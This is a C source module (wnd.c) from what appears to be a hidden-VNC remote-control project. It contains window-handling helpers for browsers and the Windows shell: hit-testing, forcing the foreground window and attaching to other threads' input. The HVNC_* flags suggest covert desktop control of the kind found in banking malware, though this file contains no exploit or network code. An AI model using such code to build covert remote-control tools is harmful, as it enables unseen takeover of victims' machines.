//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// VNC project. Version 1.9.17.3
//	
// module: wnd.c
// $Revision: 194 $
// $Date: 2014-07-11 16:55:06 +0400 (Пт, 11 июл 2014) $
// description: 
//	functions for windows manipulation

#include "project.h"
#include "rt\str.h"
#include "rt\file.h"

WND_CLASS_INFO wciInfo[]={
	{HASH_MENU,WCF_MOUSE_CLIENT_TO_SCREEN|WCF_MOUSE_AUTOCAPTURE|WCF_MENU,0,0,0},
	{HASH_BUTTON,WCF_DRAW_CHILD,0,0,0},

	// firefox
	{HASH_MOZILLAMENU,WCF_MOUSE_AUTOCAPTURE|WCF_MENU,0,0,0},
	{HASH_MOZILLAWND,WCF_DRAW_CHILD,0,0,0},
//	{HASH_MOZILLADLG,WCF_MOZILLA,0},

	{HASH_QPOPUP,WCF_MOUSE_AUTOCAPTURE|WCF_MENU,0,0,0},
	{HASH_BASEBAR,WCF_MOUSE_AUTOCAPTURE|WCF_MENU|WCF_NEVERCLOSE|WCF_STARTMENU,0,0,0},
	{HASH_MENUSITE,WCF_MOUSE_AUTOCAPTURE|WCF_MENU|WCF_NEVERCLOSE|WCF_STARTMENU,0,0,0},
	{HASH_TOOLTIP32,WCF_NO_CAPTURE,0,0,0},
	{HASH_DESK,WCF_PAINT_ALWAYS_BOTTOM,0,0,0},
	{HASH_STARMENU,WCF_MOUSE_AUTOCAPTURE|WCF_MENU|WCF_NEVERCLOSE|WCF_STARTMENU,0,0,0},
	{HASH_SYSSHADOW,WCF_IGNOREWINDOW,0,0,0},
	{HASH_WORKERW,WCF_PAINT_ALWAYS_BOTTOM,0,0,0},

	//java
	{HASH_AWTFRAME, WCF_JAVA | WCF_DRAW_CHILD,0,0,0},
	{HASH_AWTDIALOG,WCF_JAVA | WCF_DRAW_CHILD,0,0,0},
	{HASH_AWTCANVAS,WCF_JAVA | WCF_DRAW_CHILD,0,0,0},

	// IE
	{HASH_IESERVER,WCF_DRAW_CHILD/*|WCF_XP_MOUSE*/,0,0,0},
	{HASH_IEFRAME,/*WCF_DRAW_CHILD|*/WCF_XP_MOUSE, 0,0,0},
	{HASH_LINKS_EXPLORER,WCF_DRAW_CHILD,0,0,0},
	{HASH_DirectUIHWND,WCF_DRAW_CHILD/*|WCF_XP_MOUSE*/,0,0,0},

	{HASH_IME,WCF_IGNOREWINDOW,0,0,0},
	{HASH_MSCTFIMEUI,WCF_IGNOREWINDOW, 0,0,0},
	{HASH_GDIPHOOKWND,WCF_IGNOREWINDOW,0,0,0},
	{HASH_AUTOSUGGEST,WCF_IGNOREWINDOW,0,0,0},

	//opera
	{HASH_OPERA, WCF_OPERA | WCF_DRAW_CHILD ,0,0,0},
	{HASH_OUIWINDOW,WCF_XP_AND_BELOW | WCF_MENU,0,0,0},
	{HASH_OUIWINDOW,WCF_ABOVE_XP | /*WCF_JOPERA |*/ WCF_DRAW_CHILD | WCF_MENU,0,0,0},

	//opera
	// querying version is too long process
	//{HASH_CHROME_WIDGETWIN_2,/*WCF_OPERA|WCF_DRAW_CHILD|*/WCF_MOUSE_AUTOCAPTURE|WCF_MENU,HOST_OPERA,0,21},
	{HASH_CHROME_WIDGETWIN_0,WCF_OPERA|WCF_DRAW_CHILD|WCF_W7_AND_BELOW,HOST_OPERA,0,0},

	// chrome 
	{HASH_CHROME_WIDGETWIN_2,WCF_OPERA|WCF_DRAW_CHILD|WCF_MOUSE_AUTOCAPTURE|WCF_MENU,0,0,0},
	{HASH_CHROME_WIDGETWIN_1,WCF_OPERA|WCF_DRAW_CHILD|WCF_W7_AND_BELOW,HOST_CHROME,0,0},

	//{HASH_CHROME_WIDGETWIN_2,WCF_OPERA|WCF_MOUSE_AUTOCAPTURE|WCF_MENU,0,0,0},
	//{HASH_CHROME_WIDGETWIN_1,WCF_OPERA|WCF_DRAW_CHILD|WCF_W7_AND_BELOW,0,0,0},
};

_MessageBoxTimeout MessageBoxTimeout = NULL;

HWND FindWnd(HWND hParent,TCHAR *lpClass,TCHAR *lpText)
{
	HWND hWnd;
	int i=0;
	while (!(hWnd=FindWindowEx(hParent,NULL,lpClass,lpText)))
	{
		if (i++ > 40)
			break;
		Sleep(2);
	}
	return hWnd;
}

BOOL CALLBACK _GetBestChildProc(HWND hWnd,LPARAM lParam)
{
	PCURSOR_INFO lpCurInfo=(PCURSOR_INFO)lParam;
	WINDOWINFO wiInfo;
	wiInfo.cbSize=sizeof(WINDOWINFO);

	GetWindowInfo(hWnd,&wiInfo);
	if (PtInRect(&wiInfo.rcWindow,lpCurInfo->pt))
	{
		if (wiInfo.dwStyle & WS_VISIBLE)
		{
			DWORD dwArea = 
				( wiInfo.rcWindow.right - wiInfo.rcWindow.left ) *
					( wiInfo.rcWindow.bottom - wiInfo.rcWindow.top );
			if ((dwArea == lpCurInfo->dwArea) && 
				(GetParent(hWnd) == lpCurInfo->hGlobalWnd))
			{
				lpCurInfo->dwArea++;
			}

			if (dwArea < lpCurInfo->dwArea)
			{
				lpCurInfo->dwArea=dwArea;
				lpCurInfo->hGlobalWnd=hWnd;
			}
		}
	}
	return TRUE;
}


HWND GetBestChild(HWND hWnd,POINT pt)
{
	HWND hParent=GetParent(hWnd);
	CURSOR_INFO ciCursor;

	if ((!hParent) || (GetWindowLongPtr(hWnd,GWL_STYLE) & WS_POPUP)){
		hParent = hWnd;
	}

	ciCursor.dwArea=-1;
	ciCursor.pt=pt;
	ciCursor.hGlobalWnd=NULL;
	EnumChildWindows(hParent,_GetBestChildProc,(LPARAM)&ciCursor);

	if (!ciCursor.hGlobalWnd){
		ciCursor.hGlobalWnd = hWnd;
	}

	return ciCursor.hGlobalWnd;
}

static void _EnumChilds(HWND hWnd,PCURSOR_INFO ciCursor)
{
	do
	{
		WINDOWINFO wiInfo;
		wiInfo.cbSize=sizeof(WINDOWINFO);

		GetWindowInfo(hWnd,&wiInfo);
		if (PtInRect ( &wiInfo.rcWindow, ciCursor->pt ) )
		{
			if (wiInfo.dwStyle & WS_VISIBLE)
			{
				DWORD dwArea = 
					( wiInfo.rcWindow.right - wiInfo.rcWindow.left ) *
					( wiInfo.rcWindow.bottom - wiInfo.rcWindow.top );

				if (dwArea <= ciCursor->dwArea)
				{
					ciCursor->dwArea     = dwArea;
					ciCursor->hGlobalWnd = hWnd;
				}

				// enum children
				_EnumChilds(
					GetWindow(GetWindow(hWnd,GW_CHILD),GW_HWNDLAST),
					ciCursor
					);
			}
		}
	}while (hWnd=GetWindow(hWnd,GW_HWNDPREV));
	return;
}

HWND _GetBestChild(HWND hWnd,POINT pt)
{
	CURSOR_INFO ciCursor;

	ciCursor.dwArea=-1;
	ciCursor.pt=pt;
	ciCursor.hGlobalWnd=hWnd;

	_EnumChilds(
		GetWindow(GetWindow(hWnd,GW_CHILD),GW_HWNDLAST),
		&ciCursor
		);
	return ciCursor.hGlobalWnd;
}

HWND GetBestChildEx(HWND hWnd,POINT pt)
{
	CURSOR_INFO ciCursor;

	ciCursor.dwArea=-1;
	ciCursor.pt=pt;
	ciCursor.hGlobalWnd=NULL;
	EnumChildWindows(hWnd,_GetBestChildProc,(LPARAM)&ciCursor);

	if (!ciCursor.hGlobalWnd){
		ciCursor.hGlobalWnd = hWnd;
	}
	return ciCursor.hGlobalWnd;
}

BOOL IsAltTabItem(WINDOWINFO *lpWndInfo)
{
	return ((!(lpWndInfo->dwStyle & WS_MINIMIZE)) && 
		(!(lpWndInfo->dwStyle & WS_CHILD)) && 
		(lpWndInfo->dwStyle & WS_VISIBLE) && 
		(!(lpWndInfo->dwExStyle & WS_EX_TRANSPARENT)) && 
		((lpWndInfo->dwStyle & WS_OVERLAPPEDWINDOW) || (lpWndInfo->dwStyle & WS_POPUPWINDOW)) && 
		(!(lpWndInfo->dwExStyle & WS_EX_TOOLWINDOW)) && (!(lpWndInfo->dwStyle & WS_DISABLED)));
}

BOOL IsWindowVisibleEx( HWND hWnd )
{
	BOOL bVisible = IsWindowVisible(hWnd);
	return ( bVisible && ((GetWindowLongPtr(hWnd,GWL_EXSTYLE) & WS_EX_TRANSPARENT)!=WS_EX_TRANSPARENT));
}

BOOL IsWindowInFullScreenMode(PVNC_DESKTOP pDesktop, HWND hWnd )
{
	BOOL bRet = FALSE;
	if ((IsWindowEx(pDesktop,hWnd)) && (IsWindowVisibleEx(hWnd)))
	{
		RECT rcWindow;
		GetWindowRect(hWnd,&rcWindow);
		if ((!rcWindow.top) && (!rcWindow.left) && 
			(pDesktop->dwHeight <= (DWORD)rcWindow.bottom) && 
			(pDesktop->dwWidth <= (DWORD)rcWindow.right))
		{
			bRet = TRUE;
		}
	}
	return bRet;
}

BOOL IsMDI(HWND hWnd)
{
	CHAR szClass[200];
	while (hWnd)
	{
		GetClassNameA(GetParent(hWnd),szClass,sizeof(szClass));
		if (!lstrcmpiA(szClass,"mdiclient"))
			return TRUE;
		hWnd=GetParent(hWnd);
	}
	return FALSE;
}

BOOL IsConsole(HWND hWnd)
{
	CHAR szClass[200];
	GetClassNameA( hWnd,szClass,sizeof(szClass));
	if (!lstrcmpiA(szClass,"ConsoleWindowClass"))
		return TRUE;
	return FALSE;
}

BOOL IsMenuEx(PVNC_DESKTOP pDesktop,HWND hWnd)
{
	return (((GetWindowLongPtr(hWnd,GWL_EXSTYLE) & WS_EX_TOOLWINDOW) && (GetWindowLongPtr(hWnd,GWL_STYLE) & WS_CHILD)) || (GetWindowClassFlags(pDesktop,hWnd) & WCF_MENU));
}

BOOL IsWindowEx(PVNC_DESKTOP pDesktop,HWND hWnd)
{
	BOOL bRet=FALSE;
	if (IsWindow(hWnd))
	{
		bRet=(!(GetWindowClassFlags(pDesktop,hWnd) & WCF_IGNOREWINDOW));
		if (bRet){
			bRet=(!(GetWindowClassFlags(pDesktop,GetAncestor(hWnd,GA_ROOT)) & WCF_IGNOREWINDOW));
		}
	}
	return bRet;
}

BOOL IsStyleHaveSizeBorders(LONG_PTR dwStyle)
{
	return ((((dwStyle & WS_CAPTION) == WS_CAPTION) || (dwStyle & (WS_POPUP|WS_THICKFRAME))) != 0);
}

DWORD GetWindowProcessHashAndPath( IN HWND hWnd, LPSTR ProcessPath, LPDWORD ProcessPathLength )
{
	DWORD Hash = 0;
	DWORD ProcessID = 0;
	DWORD Length = *ProcessPathLength;
	*ProcessPathLength = 0;
	if ( GetWindowThreadProcessId ( hWnd, &ProcessID ) && ProcessID ){
		HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,FALSE,ProcessID);
		if ( hProcess )
		{
			if ( Length = GetModuleFileNameExA(hProcess,NULL,ProcessPath,Length) )
			{
				LPSTR BaseName = strrchr(ProcessPath, '\\');
				if ( BaseName == 0 ){
					BaseName = ProcessPath;
				}else{
					BaseName = BaseName+1;
				}
				Hash = StrHashA(BaseName);
				*ProcessPathLength = Length;
			}
			CloseHandle ( hProcess );
		}
	}
	return Hash;
}

int GetClassHashEx(char * ClassName)
{
	int Hash = 0;
	if ( ClassName ){
		Hash = chksum_crc32((byte*)ClassName, lstrlenA(ClassName));
	}
	return Hash;
}

int GetClassHash(HWND hWnd)
{
	char szClassName[256+1];
	return chksum_crc32((byte*)szClassName,GetClassNameA(hWnd,szClassName,sizeof(szClassName)));
}

DWORD GetWindowClassFlags(PVNC_DESKTOP pDesktop,HWND hWnd)
{
	int dwClassHash=GetClassHash(hWnd);
	DWORD dwFlags=0;
	unsigned i;

	CHAR  ProcessPath[MAX_PATH];
	DWORD Length = MAX_PATH-1;
	DWORD dwProcessHash = 0;
	WORD  MajorVer = 0; // process major

	if (dwClassHash)
	{
		for ( i=0; i < _countof(wciInfo); i++)
		{
			if (dwClassHash == wciInfo[i].dwClassHash)
			{
				if ( wciInfo[i].wMethod & WCF_W7_AND_BELOW )
				{
					if ( OsGetMajorVersion() > 6 || 
						(OsGetMajorVersion() == 6) && (OsGetMinorVersion() > 1) )
					{
						continue;
					}
				}
				if ( wciInfo[i].wMethod & WCF_XP_AND_BELOW )
				{
					if ( OsGetMajorVersion() > 5 )
					{
						continue;
					}
				}
				else if ( wciInfo[i].wMethod & WCF_ABOVE_XP )
				{
					if ( OsGetMajorVersion() <= 5 )
					{
						continue;
					}
				}

				if ( wciInfo[i].dwProcess ){
					if ( dwProcessHash == 0 ){
						dwProcessHash = GetWindowProcessHashAndPath(hWnd,ProcessPath,&Length);
					}
					if ( dwProcessHash != wciInfo[i].dwProcess ){
						continue;
					}
					if ( wciInfo[i].MinMajor || wciInfo[i].MaxMajor )
					{
						if ( MajorVer == 0 ){ 
							FileGetVersionA(ProcessPath,&MajorVer,NULL,NULL,NULL);
						}
						if ( MajorVer < wciInfo[i].MinMajor ){
							continue;
						}
						if ( MajorVer > wciInfo[i].MaxMajor ){
							continue;
						}
					}
				}

				dwFlags|=wciInfo[i].wMethod;
				break;
			}
		}
		if (dwClassHash == HASH_IESERVER)
		{
			HWND hParent=GetParent(hWnd);
			if (hParent == pDesktop->hDefView)
				dwFlags|=WCF_IGNOREWINDOW;
		}
	}
	return dwFlags;
}

DWORD GetWindowClassFlagsEx(PVNC_DESKTOP pDesktop,char * ClassName)
{
	int dwClassHash=GetClassHashEx(ClassName);
	DWORD dwFlags=0;
	unsigned i;

	if (dwClassHash)
	{
		for ( i=0; i < _countof(wciInfo); i++)
		{
			if (dwClassHash == wciInfo[i].dwClassHash)
			{
				if ( wciInfo[i].wMethod & WCF_XP_AND_BELOW )
				{
					if ( OsGetMajorVersion() > 5 )
					{
						continue;
					}
				}
				else if ( wciInfo[i].wMethod & WCF_ABOVE_XP )
				{
					if ( OsGetMajorVersion() <= 5 )
					{
						continue;
					}
				}
				dwFlags|=wciInfo[i].wMethod;
				break;
			}
		}
	}
	return dwFlags;
}

BOOL CheckWindowStyle(HWND hWnd)
{
	return ((!(GetWindowLongPtr(hWnd,GWL_STYLE) & WS_CHILD)) && (IsWindowVisibleEx(hWnd)) && (!IsIconic(hWnd)));
}

HWND GetTopPopupWindow(PVNC_DESKTOP Desktop,HWND hWnd)
{
	if ((IsWindowEx(Desktop,hWnd)) && (hWnd != Desktop->hShellWnd))
	{
		if (GetWindowLongPtr(hWnd,GWL_STYLE) & WS_DISABLED)
		{
			HWND hPopup=GetLastActivePopup(hWnd);
			HWND hCurWnd;
			if ((hPopup) && (hPopup != hWnd))
				return hPopup;

			hCurWnd=GetWindow(GetWindow(Desktop->hDeskWnd,GW_CHILD),GW_HWNDLAST);
			do
			{
				WINDOWINFO wiInfo;
				wiInfo.cbSize=sizeof(WINDOWINFO);
				GetWindowInfo(hCurWnd,&wiInfo);
				if ((GetWindow(hCurWnd,GW_OWNER) == hWnd) &&
					(wiInfo.dwStyle & WS_VISIBLE) &&
					(!(wiInfo.dwStyle & WS_MINIMIZE)) &&
					(!(wiInfo.dwStyle & WS_EX_TRANSPARENT)) &&
					((wiInfo.dwExStyle & WS_EX_DLGMODALFRAME) || (wiInfo.dwStyle & (WS_DLGFRAME/**|WS_OVERLAPPEDWINDOW*/|WS_POPUPWINDOW))))
				{
					DWORD wFlags=GetWindowClassFlags(Desktop,hCurWnd);
					if ((!(wFlags & WCF_MOUSE_AUTOCAPTURE)) && (!(wFlags & WCF_PAINTMETHOD_NOP)) && (hCurWnd != hWnd))
						return hCurWnd;
				}
			}
			while (hCurWnd=GetWindow(hCurWnd,GW_HWNDPREV));

			hWnd=GetTopPopupWindow(Desktop,GetWindow(hWnd,GW_OWNER));
			if (!hWnd){
				hWnd = Desktop->hDeskWnd;
			}
			return hWnd;
		}
	}
	return NULL;
}

VOID SetForegroundWnd(PVNC_SESSION pSession,HWND hWnd)
{
 	if (IsWindowEx(&pSession->Desktop,hWnd))
	{
		HWND hwndForeground;
		DWORD dwFGProcessId = 0,dwFGThreadId = 0,dwThisThreadId = 0;

		BOOL bChild = ((GetWindowLongPtr(hWnd,GWL_STYLE) & WS_CHILD)==WS_CHILD);
		if ( bChild )
		{
			HWND hWndParent = GetAncestor( hWnd, GA_PARENT );
			DbgPrint("hWnd = %p hWndParent = %p \n",hWnd,hWndParent);
			hWnd = hWndParent;
		}

		hwndForeground = SS_GET_FOREGROUND_WND(pSession);
		if (hwndForeground != hWnd)
		{
			if ((CheckWindowStyle(hWnd)) && 
				(!(GetWindowClassFlags(&pSession->Desktop,hWnd) & (WCF_NO_CAPTURE|WCF_PAINTMETHOD_NOP|WCF_MOUSE_AUTOCAPTURE)))
				)
			{
				DbgPrint("hwndForeground = %p hWnd = %p \n",hwndForeground,hWnd);
				// update mouse capture
				MouseChangeCapture(
					pSession,
					GetWindowThreadProcessId(hWnd,NULL),
					hWnd,HTNOWHERE,TRUE
					);

				if ( hwndForeground ){
					dwFGThreadId   = GetWindowThreadProcessId(hwndForeground,&dwFGProcessId);
				}
				dwThisThreadId = GetCurrentThreadId();

				if ( dwFGThreadId ){
					AttachThreadInput(dwThisThreadId,dwFGThreadId,TRUE);
				}
				BringWindowToTop(hWnd);
				SetForegroundWindow(hWnd);
				SetActiveWindow(hWnd);
				//SetCapture(hWnd);
				SetFocus(hWnd);
				if ( dwFGThreadId ){
					AttachThreadInput(dwThisThreadId,dwFGThreadId,FALSE);
				}

				//if ( !(pSession->Desktop.dwFlags & HVNC_NO_WINDOWS_MANIPULATION_TRICK))
				//{
				//	pSession->Desktop.WndWatcher.bMessageBoxIsShown = TRUE;
				//	MessageBoxTimeout(hWnd,NULL,HVNC_MSG_TITLE,MB_OK+MB_SETFOREGROUND+MB_SYSTEMMODAL+MB_ICONINFORMATION,0,1);
				//	pSession->Desktop.WndWatcher.bMessageBoxIsShown  = FALSE;
				//	SetWindowPos(hWnd,HWND_TOP,0,0,0,0,SWP_NOMOVE|SWP_NOSIZE);
				//}
				//else
				if ( pSession->Desktop.WndWatcher.bWatcherStarted )
				{
					SetWindowPos(hWnd,HWND_TOP,0,0,0,0,SWP_NOMOVE|SWP_NOSIZE);
					WW_SetFrgWnd(pSession,hWnd,TRUE);
					SS_SET_FOREGROUND_WND(pSession,hWnd);
				}
			}
		}
	}
	return;
}

HWND GetWindowFocus(HWND hWnd)
{
	GUITHREADINFO gtiInfo={0};
	gtiInfo.cbSize=sizeof(gtiInfo);
	GetGUIThreadInfo(GetWindowThreadProcessId(hWnd,NULL),&gtiInfo);
	return gtiInfo.hwndFocus;
}

HWND _WindowFromPoint(PVNC_SESSION pSession,POINT pt,WORD *dwHitTest,HWND *hlpParent, WORD wDeep,BOOL bClick)
{
	HWND hWnd;
	DWORD_PTR dwResult;

	if ( ( pSession->Desktop.dwFlags &  HVNC_NO_WNDHOOK ) != HVNC_NO_WNDHOOK )
	{
		if ( pSession->Desktop.dwFlags & HVNC_NO_WINDOWS_MANIPULATION_TRICK )
		{
			hWnd = WindowFromPoint ( pt );
			if (dwHitTest)
			{
				DWORD_PTR dwResult;
				SendMessageTimeout(
					hWnd,
					WM_NCHITTEST,0,
					MAKELPARAM(pt.x,pt.y),
					SMTO_ABORTIFHUNG | SMTO_NORMAL,
					100,
					&dwResult
					);
				*dwHitTest=(WORD)dwResult;
			}
			return hWnd;
		}
	}

//	if ( ( pSession->Desktop.dwFlags &  HVNC_NO_WNDHOOK ) != HVNC_NO_WNDHOOK ){
		hWnd = WW_WindowFromPointEx ( pSession, pt, hlpParent );
//	}else{
//		hWnd = WindowFromPoint(pt);
//	}
	if (hWnd)
	{
		if (hWnd == pSession->Desktop.hTrayNotifyWnd )
		{
			if (dwHitTest){
				*dwHitTest = HTCLIENT;
			}
			return pSession->Desktop.hTrayUserNotifyToolbarWnd;
		}
		if ((hWnd == pSession->Desktop.hTrayUserNotifyToolbarWnd) || 
			(hWnd == pSession->Desktop.hTraySystemNotifyToolbarWnd) || 
			(hWnd == pSession->Desktop.hTrayUserNotifyOverflowToolbarWnd))
		{
			if (dwHitTest){
				*dwHitTest=HTCLIENT;
			}
			return hWnd;
		}

		if ( hWnd == pSession->Desktop.hTakSwWnd ){
			hWnd = RealChildWindowFromPoint( pSession->Desktop.hDeskWnd, pt );
		}
		else if (hWnd == pSession->Desktop.hToolBarWnd )
		{
			DWORD_PTR dwBtn = 0;
			POINT cli_pt=pt;

			ScreenToClient(pSession->Desktop.hToolBarWnd,&cli_pt);
			SendMessageTimeout(
				pSession->Desktop.hToolBarWnd,
				SS_GET_DATA(pSession)->dwVNCMessage,
				VMW_TBHITTEST,
				MAKELPARAM(cli_pt.x,cli_pt.y),
				SMTO_ABORTIFHUNG | SMTO_NORMAL,
				WND_MSG_TIMEOUT,
				&dwBtn
				);

			if (dwHitTest){
				*dwHitTest=HTCLIENT;
			}
			if (dwBtn < 0){
				hWnd = pSession->Desktop.hTakSwRebarWnd;
			}
			return hWnd;
		}

		if (SendMessageTimeout(hWnd,WM_NCHITTEST,0,MAKELPARAM(pt.x,pt.y),SMTO_ABORTIFHUNG | SMTO_NORMAL,100,&dwResult))
		{
			if ((dwResult == HTTRANSPARENT) && (!wDeep))
			{
				HWND hCurWnd = hWnd;
				SetWindowLongPtr(hCurWnd,GWL_STYLE,GetWindowLongPtr(hCurWnd,GWL_STYLE) | WS_DISABLED);
				hWnd=_WindowFromPoint(pSession,pt,dwHitTest,hlpParent, 1,bClick);
				SetWindowLongPtr(hCurWnd,GWL_STYLE,GetWindowLongPtr(hCurWnd,GWL_STYLE) & ~WS_DISABLED);
			}
			else
			{
				HWND hParent=GetAncestor(hWnd,GA_ROOT);
				HWND hForegroundWnd=SS_GET_FOREGROUND_WND(pSession);

				if (/*(hParent != hForegroundWnd) && */
					(hParent != pSession->Desktop.hShellWnd) && 
					(!(GetWindowClassFlags(&pSession->Desktop,hForegroundWnd) & WCF_PAINT_ALWAYS_BOTTOM)))
				{
					if ((!(GetWindowLongPtr(hWnd,GWL_STYLE) & WS_CHILD)))
					{
						WINDOWINFO wiInfo;
						wiInfo.cbSize=sizeof(WINDOWINFO);
						GetWindowInfo(hForegroundWnd,&wiInfo);

						// NOTE: problems with office 2003 menu
						if ((wiInfo.dwStyle & WS_VISIBLE) && (!(wiInfo.dwStyle & WS_MINIMIZE)) )
						{
							if (PtInRect(&wiInfo.rcWindow,pt))
							{
								if (!(GetWindowClassFlags(&pSession->Desktop,hWnd) & WCF_MOUSE_AUTOCAPTURE))
								{
									LONG_PTR dwStyle=GetWindowLongPtr(hWnd,GWL_STYLE);
									if (dwStyle & (WS_POPUPWINDOW|WS_OVERLAPPEDWINDOW))
									{
										if (!SendMessageTimeout(hWnd,WM_NCHITTEST,0,MAKELPARAM(pt.x,pt.y),SMTO_ABORTIFHUNG | SMTO_NORMAL,100,&dwResult)){
											hWnd=NULL;
										}
										if (dwResult == HTCLIENT)
										{
											HWND hChild=hForegroundWnd;
											POINT cli_pt=pt;
											hParent = pSession->Desktop.hDeskWnd;
											
											while (TRUE)
											{
												HWND hWnd;
												MapWindowPoints(hParent,hChild,&cli_pt,1);
												hWnd=RealChildWindowFromPoint(hChild,cli_pt);
												if ((!hWnd) || (hWnd == hChild))
													break;
												hParent=hChild;
												hChild=hWnd;
											}

											hWnd=hChild;
										}
										else{
											hWnd=hForegroundWnd;
										}
									}
								}
							}
						}
						else
						{
							SetForegroundWnd(pSession,hParent);
							//return hWnd;
						}
					}else{
						if (dwResult == HTTRANSPARENT) {
							SendMessageTimeout(hParent,WM_NCHITTEST,0,MAKELPARAM(pt.x,pt.y),SMTO_ABORTIFHUNG|SMTO_NORMAL,100,&dwResult);
						}
					}
				}
				if (dwHitTest){
					*dwHitTest=(WORD)dwResult;
				}
				//if ( hlpParent){
				//	*hlpParent = hParent;
				//}
			}
		}
		else
			hWnd=NULL;
	}
	return hWnd;
}

// window thread input attaching
// we need to send some messages to input thread directly (setfocus)
VOID AttachToInput( PVNC_SESSION pVncSession, HWND hWnd )
{
	DWORD idAttach = GetCurrentThreadId();
	DWORD idAttachTo = 0;
	DWORD idProcess = 0;

	idAttachTo = GetWindowThreadProcessId(hWnd,&idProcess);
	if ( idAttachTo )
	{
		if ( pVncSession->Desktop.idInputThread ){
			if ( pVncSession->Desktop.idInputThread != idAttachTo ||
				pVncSession->Desktop.idInputPorcess != idProcess )
			{
				AttachThreadInput(idAttach,pVncSession->Desktop.idInputThread,FALSE);
				pVncSession->Desktop.idInputThread = 0;
				pVncSession->Desktop.idInputPorcess = 0;
			}
		}
		if ( AttachThreadInput(idAttach,idAttachTo,TRUE) )
		{
			pVncSession->Desktop.idInputThread = idAttachTo;
			pVncSession->Desktop.idInputPorcess = idProcess;
		}
	}
}

VOID DettachToInput( PVNC_SESSION pVncSession, HWND hWnd )
{
	DWORD idAttach = GetCurrentThreadId();
	if ( pVncSession->Desktop.idInputThread ){
		AttachThreadInput(idAttach,pVncSession->Desktop.idInputThread,FALSE);
		pVncSession->Desktop.idInputThread = 0;
		pVncSession->Desktop.idInputPorcess = 0;
	}
}

VOID DestroyMenus( PVNC_DESKTOP Desktop, HWND hWnd )
{
	BOOL bStartMenu;
	HWND hCurWnd;

	if ( Desktop->dwFlags & HVNC_NO_WINDOWS_MANIPULATION_TRICK){
		return;
	}

	bStartMenu = 
		((IsXP())&& ((GetWindowClassFlags(Desktop,hWnd) & WCF_STARTMENU) || 
			(GetWindowClassFlags(Desktop,GetAncestor(hWnd,GA_ROOT)) & WCF_STARTMENU)));

	if ((bStartMenu) || (GetWindowClassFlags(Desktop,hWnd) & WCF_MENU))
		return;

	hCurWnd = 
		GetWindow(
			GetWindow(Desktop->hDeskWnd,GW_CHILD),
			GW_HWNDLAST
			);
	do
	{
		if (IsWindowVisibleEx( hCurWnd ))
		{
			LONG_PTR dwStyle=GetWindowLongPtr(hCurWnd,GWL_STYLE);
			LONG_PTR dwFlags=GetWindowClassFlags(Desktop,hCurWnd);
			HWND hParent=GetAncestor(hCurWnd,GA_ROOT);
			if ((dwFlags & WCF_MENU) && (hCurWnd != hWnd) && (hParent != hWnd) &&
				((!bStartMenu) || (!(((dwFlags & WCF_STARTMENU)) || 
					(dwFlags & WCF_STARTMENU)))))
			{
				if ((!(dwFlags & WCF_NEVERCLOSE)) || (IsXP())){
					PostMessage(hCurWnd,WM_CLOSE,0,0);
				}
				else{
					ShowWindow(hCurWnd,SW_HIDE);
				}
			}
			else if (dwStyle & WS_CHILD){
				ShowWindow(hCurWnd,SW_HIDE);
			}
		}
	}
	while (hCurWnd=GetWindow(hCurWnd,GW_HWNDPREV));
	return;
}

int GetWindowProportion( HWND hWnd )
{
	int nRet = NOTDEFINED;
	int nHor, nVer;
	RECT rc;

	GetWindowRect(hWnd, &rc);

	nHor = rc.right  - rc.left;
	nVer = rc.bottom - rc.top;

	if (nHor >= nVer)
	{
		nRet = HORIZONTAL;
	}
	else if (nHor < nVer)
	{
		nRet = VERTICAL;
	}

	return nRet;
}

BOOL IsDialogWindow( HWND hWnd )
{
	BOOL IsDialog = FALSE;
	CHAR szClassName[ 10 ] = "/0";
	if ( GetClassNameA( hWnd, szClassName, 10 ) )
	{
		IsDialog = ( BOOL )( lstrcmpiA( "#32770", szClassName ) == 0 );
	}
	return IsDialog;
}